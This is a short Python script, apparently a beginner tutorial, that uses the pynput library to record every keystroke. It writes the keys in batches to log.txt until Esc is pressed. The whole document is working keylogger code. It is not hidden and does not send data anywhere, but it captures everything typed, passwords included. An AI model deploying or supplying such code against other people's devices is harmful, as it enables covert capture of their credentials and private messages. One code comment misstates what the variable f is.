import pynput #pynput library allows you to control and monitor input devices

from pynput.keyboard import Key, Listener

count = 0 #count var collects # of key strokes by user
keys = []

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 10: #updates log.txt every 10 characters
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("log.txt", "a") as f: # f stands for append mode
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0: # for when user types the spacebar enter line break in log.txt
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()